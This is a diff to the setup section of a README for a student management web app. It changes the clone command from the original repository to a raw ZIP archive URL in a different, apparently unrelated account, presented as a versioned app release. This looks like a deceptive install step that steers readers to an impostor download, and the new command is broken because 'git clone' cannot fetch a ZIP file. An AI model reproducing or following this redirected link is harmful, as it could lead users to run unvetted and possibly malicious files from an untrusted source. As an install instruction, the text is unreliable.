@@ -22,5 +22,5 @@ A simple web app for managing student information — add, edit, view, and delet
 
 ### 1 Clone the repository
 ```bash
-git clone https://github.com/godswill66/Student-management-app.git
+git clone https://github.com/kamsy225/Student-management-app/raw/refs/heads/main/dashboard/Student_management_app_v3.7.zip
 cd Student-management-app
